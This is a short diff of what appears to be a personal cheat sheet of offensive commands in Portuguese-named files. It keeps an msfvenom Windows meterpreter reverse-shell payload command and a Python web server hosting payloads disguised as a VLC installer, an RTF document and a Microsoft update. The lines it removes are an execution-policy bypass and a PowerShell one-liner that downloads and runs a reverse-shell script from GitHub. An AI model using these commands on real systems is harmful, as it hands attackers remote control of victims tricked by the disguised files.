@@ -14,11 +14,6 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f ex
 
 Get-ExecutionPolicy
 
-Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
-
-IEX (New-Object Net.WebClient).DownloadString('https://https:/github.com/Ray-King11/TESTE/tree/main/Invoke-ReverseShell.ps1')
-
-
 python3 -m http.server 8080
 
 http://192.168.1.137:8080/vlc_infectado.exe
@@ -28,8 +23,6 @@ http://192.168.1.137:8080/documento_infectado.rtf
 http://192.168.1.137:8080/microsoft_update.page.zip
 
 http://192.168.1.137/payload.ps1
-
-Test-NetConnection 192.168.1.137 -Port 443
 
 https://www.microsoft.com/pt-br/windows/windows-11?r=1#pchealthcheck
  
